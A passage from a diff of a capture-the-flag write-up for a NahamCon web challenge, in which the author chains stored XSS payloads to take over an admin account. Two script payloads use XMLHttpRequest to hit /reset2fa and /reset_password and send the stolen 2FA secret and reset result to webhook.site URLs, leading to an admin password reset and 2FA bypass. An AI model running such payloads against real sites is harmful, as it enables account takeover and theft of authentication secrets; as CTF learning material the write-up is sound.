@@ -42,3 +42,34 @@ I wrote below payload to hijack the result of  ```/reset2fa``` and send it to ou
     document.location='https://webhook.site/x4xx4-xxx-xxx-xxxx-xxxx?otp='+xhr.response;
 </script>
 ```
+## result 
+![Screenshot_2022-05-01 Webhook site - Test, process and transform emails and HTTP requests](https://user-images.githubusercontent.com/83473054/166119457-2e486284-6bf5-49c3-91c4-304fa9f91cf4.png)
+
+now we have secret token. we should convert it to QR code
+![Screenshot_2022-05-01_05_13_51](https://user-images.githubusercontent.com/83473054/166119519-e1885483-67f6-4023-9052-cad3cf9c0dc1.png)
+got it and scaned with my phone, now I have the google auth
+
+the next step is reseting admin password.
+
+I wrote below payload to reset admin password
+
+```js
+<script>
+    xhr = new XMLHttpRequest();
+    xhr.open('POST', 'http://challenge.nahamcon.com:31170/reset_password', false);
+    xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+    xhr.send(JSON.stringify({"otp":"068728","password":"a","password2":"a"}));
+    document.location='https://webhook.site/3xxx4-xxxx-xxxxxx-xxxxx-xxxxx?res='+xhr.response;
+</script>
+```
+
+and got ```{"success":true}``` in my webhook response.
+
+now I can login with admin creds which it's username is ```admin``` and password is ```a``` (what we changed) and the google auth
+logged in and we are able to read the flag from admin's secrets
+
+![Screenshot_2022-05-01 Fort Knox(5)](https://user-images.githubusercontent.com/83473054/166119740-71f6c15a-9298-4b4a-bbad-bdb78ba0c352.png)
+
+
+Really interesting challnege . thanks @congon4tor#2334
+
